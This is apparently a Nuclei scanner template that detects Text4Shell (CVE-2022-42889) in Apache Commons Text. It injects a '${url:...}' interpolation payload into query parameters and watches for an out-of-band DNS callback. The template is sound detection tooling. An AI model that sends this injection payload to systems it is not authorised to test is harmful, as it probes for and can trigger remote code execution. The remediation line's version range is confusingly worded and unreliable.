http:
- extractors:
  - kval:
    - interactsh_ip
    type: kval
  - group: 2
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  - group: 1
    part: interactsh_request
    regex: null
    type: regex
  fuzzing:
  - fuzz:
    - '{{text4shell}}'
    part: query
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    text4shell:
    - ${url:UTF-8:https://{{Hostname}}.q.{{interactsh-url}}}
id: CVE-2022-42889
info:
  author: mordavid,princechaddha
  classification:
    cve-id: CVE-2022-42889
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-94
  description: 'Apache Commons Text performs variable interpolation, allowing properties
    to be dynamically evaluated and expanded. The standard format for interpolation
    is "${prefix:name}", where "prefix" is used to locate an instance of org.apache.commons.text.lookup.StringLookup
    that performs the interpolation. Starting with version 1.5 and continuing through
    1.9, the set of default Lookup instances included interpolators that could result
    in arbitrary code execution or contact with remote servers. These lookups are:
    - "script" - execute expressions using the JVM script execution engine (javax.script)
    - "dns" - resolve dns records - "url" - load values from urls, including from
    remote servers Applications using the interpolation defaults in the affected versions
    may be vulnerable to remote code execution or unintentional contact with remote
    servers if untrusted configuration values are used. Users are recommended to upgrade
    to Apache Commons Text 1.10.0, which disables the problematic interpolators by
    default.

    '
  metadata:
    confidence: tenative
  name: Text4Shell - Remote Code Execution
  reference:
  - https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om
  - http://www.openwall.com/lists/oss-security/2022/10/13/4
  - http://www.openwall.com/lists/oss-security/2022/10/18/1
  - https://securitylab.github.com/advisories/GHSL-2022-018_Apache_Commons_Text/
  - https://github.com/silentsignal/burp-text4shell
  remediation: Upgrade to Apache Commons Text component between 1.5.0 to 1.10.0.
  severity: critical
  tags: cve,cve2022,rce,oast,text4shell,dast
